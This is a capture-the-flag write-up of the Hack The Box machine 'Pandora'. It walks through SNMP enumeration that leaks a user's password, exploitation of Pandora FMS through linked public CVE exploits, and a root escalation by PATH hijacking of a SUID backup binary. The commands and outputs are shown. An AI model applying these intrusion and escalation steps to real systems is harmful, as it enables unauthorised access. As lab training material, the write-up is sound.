---
layout: default
---

# Pandora

# Enumeration

IP → 10.10.11.136

Port scan reported the following ports opened.

```python
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

```python
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPIYGoHvNFwTTboYexVGcZzbSLJQsxKopZqrHVTeF8oEIu0iqn7E5czwVkxRO/icqaDqM+AB3QQVcZSDaz//XoXsT/NzNIbb9SERrcK/n8n9or4IbXBEtXhRvltS8NABsOTuhiNo/2fdPYCVJ/HyF5YmbmtqUPols6F5y/MK2Yl3eLMOdQQeax4AWSKVAsR+issSZlN2rADIvpboV7YMoo3ktlHKz4hXlX6FWtfDN/ZyokDNNpgBbr7N8zJ87+QfmNuuGgmcZzxhnzJOzihBHIvdIM4oMm4IetfquYm1WKG3s5q70jMFrjp4wCyEVbxY+DcJ54xjqbaNHhVwiSWUZnAyWe4gQGziPdZH2ULY+n3iTze+8E4a6rxN3l38d1r4THoru88G56QESiy/jQ8m5+Ang77rSEaT3Fnr6rnAF5VG1+kiA36rMIwLabnxQbAWnApRX9CHBpMdBj7v8oLhCRn7ZEoPDcD1P2AASdaDJjRMuR52YPDlUSDd8TnI/DFFs=
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNNJGh4HcK3rlrsvCbu0kASt7NLMvAUwB51UnianAKyr9H0UBYZnOkVZhIjDea3F/CxfOQeqLpanqso/EqXcT9w=
|   256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOCMYY9DMj/I+Rfosf+yMuevI7VFIeeQfZSxq67EGxsb
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 115E49F9A03BB97DEB840A3FE185434C
|_http-title: Play | Landing
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Port 80

We first enumerate the web page using `whatweb` and `curl` .

```python
┌──(kali㉿kali)-[~/machines/linux/pandora]
└─$ whatweb 10.10.11.136
http://10.10.11.136 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[contact@panda.htb,example@yourmail.com,support@panda.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.136], Open-Graph-Protocol[website], Script, Title[Play | Landing], probably WordPress, X-UA-Compatible[IE=edge]
```

```python
┌──(kali㉿kali)-[~/machines/linux/pandora]
└─$ curl -I 10.10.11.136                         
HTTP/1.1 200 OK
Date: Mon, 20 Nov 2023 05:12:21 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Fri, 03 Dec 2021 14:00:31 GMT
ETag: "8318-5d23e548bc656"
Accept-Ranges: bytes
Content-Length: 33560
Vary: Accept-Encoding
Content-Type: text/html
```

We have obtained a domain name  → `panda.htb` .

It seems like the this is a wordpress instance, but we don’t see any typical wordpress route in the source code.

The page use `PHP`.

- Directory and file enumeration → nothing found
- Subdomain enumeration → nothing found

It seems we will have to look for something in the UDP ports.

# Foothold

Port scan in UDP realm reported SNMP service active.

```python
PORT    STATE SERVICE REASON
161/udp open  snmp    udp-response ttl 63
```

Let’s enumerate SNMP service.

- NMAP scripts

```python
|   837: 
|     Name: sh
|     Path: /bin/sh
|     Params: -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'
```

In nmap we found what seems to be credentials for a user → `daniel:HotelBabylon23` .

```python
daniel@pandora:~$ whoami
daniel
daniel@pandora:~$
```

We can use them to SSH into the machine.

# Privilege escalation

Basic enumeration didn’t show nothing, but we find that the user **matt** is running a service in `pandora.panda.htb` , so if we can execute commands from that service we execute commands as matt.

```python
daniel@pandora:/etc/apache2/sites-enabled$ cat pandora.conf 
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```

It is running only in localhost, so we need to make that internal port visible to our attacking machine. I’ve used `chisel` for this. Accessing the web we cna see that is a CMS called pandora CMS and the version is leaked:

- `v7.0NG.742_FIX_PERL2020`

There two exploits we want to use to exploit this service:

- Auth bypass → https://github.com/l3eol3eo/CVE-2021-32099_SQLi
- Command execution → https://github.com/UNICORDev/exploit-CVE-2020-5844

Using this two exploits we are able to execute commands as user `matt`, who is the user running the service. Once we have a shell we can upgrade th reverse shell to a interactive tty o we can add out public we to the authorized keys of user matt and get a SSH shell which is more comfortable.

For the escalation itself listing SUID binaries we can see that there is an awkard one.

```python
-rwsr-x---   1 root     matt        16816 Dec  3  2021 /usr/bin/pandora_backup
```

If execute this we won’t get much information, although is clear that is making a backup of the `/var/www/pandora/` directory. To know exactly what command is being executed we can use pspy in another shell and execute the binary again. The result is the following command:

 

```python
2023/11/20 18:23:27 CMD: UID=0     PID=4781   | sh -c tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/* 
2023/11/20 18:23:27 CMD: UID=0     PID=4780   | sh -c tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
```

Altought it may seem like we can abuse the typical tar wildcard abuse that’s not the case, we can try but won’t work since there is a source directory specify. Instead, we can se that tar is not an absolute path but a relative one, so we can exploit this with a `PATH hijacking` to get a shell as root.

```python
matt@pandora:~$ echo '#!/bin/bash' >> tar
matt@pandora:~$ echo 'bash' >> tar
matt@pandora:~$ chmod +x tar 
matt@pandora:~$ export PATH=.:$PATH
matt@pandora:~$ /usr/bin/pandora_backup 
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:~# id
uid=0(root) gid=1000(matt) groups=1000(matt)
root@pandora:~# whoami
root
```